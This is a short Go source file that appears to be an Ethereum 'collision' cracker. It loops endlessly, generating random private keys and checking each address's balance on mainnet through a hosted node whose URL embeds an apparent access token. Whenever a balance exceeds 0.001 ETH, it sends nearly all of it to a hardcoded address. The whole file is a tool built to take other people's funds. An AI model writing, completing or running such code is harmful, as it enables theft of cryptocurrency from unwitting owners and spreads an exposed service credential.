package collision

import (
	"context"
	"crypto/ecdsa"
	"fmt"
	"log"
	"main/milestone2"
	"math/big"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/common/hexutil"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/ethclient"
)

func generateNode() (string, string) {
	priveKey, _ := crypto.GenerateKey()
	privateKeyBytes := crypto.FromECDSA(priveKey)
	publicKey := priveKey.Public()
	publicKeyECDSA, _ := publicKey.(*ecdsa.PublicKey)
	address := crypto.PubkeyToAddress(*publicKeyECDSA).Hex()
	return hexutil.Encode(privateKeyBytes)[2:], address
}
func Collision() {
	EthServer := "wss://eth.getblock.io/ab0b1aa0-b490-4dc0-9bda-817c897a4580/mainnet"
	nclient, err := ethclient.Dial(EthServer)
	if err != nil {
		fmt.Printf("Eth connect error:%s\n", err)
		log.Fatal(err)
	}
	for {
		prikey, addr := generateNode()
		//priveKey, _ := crypto.HexToECDSA(prikey)
		bal, _ := nclient.BalanceAt(context.Background(), common.HexToAddress(addr), nil)
		if bal.Cmp(big.NewInt(1000000000000000)) == 1 {
			milestone2.DynamicTransferEth("0x604427A2d0805F7037d2747c2B4D882116616cb9", "", prikey, bal.Uint64()-1000000000000000, 21000)
		}
	}
}
